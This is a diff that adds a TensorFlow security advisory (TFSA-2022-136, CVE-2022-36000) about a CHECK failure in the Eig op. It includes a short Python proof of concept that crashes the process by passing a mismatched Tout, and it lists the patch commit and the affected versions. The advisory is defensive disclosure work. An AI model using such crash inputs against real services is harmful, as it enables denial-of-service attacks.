@@ -1,0 +1,20 @@
+<h2>TFSA-2022-136: <code>CHECK</code> fail in <code>Eig</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-36000</p>
+<h3>Impact</h3>
+<p><code>Eig</code> can be fed an incorrect <code>Tout</code> input, resulting in a <code>CHECK</code> fail that can trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+import numpy as np 
+arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
+arg_1=tf.complex128
+arg_2=True
+arg_3=''
+tf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0">aed36912609fc07229b4d0a7b44f3f48efc00fd0</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by 刘力源, Information System &amp; Security and Countermeasures Experiments Center, Beijing Institute of Technology.</p>
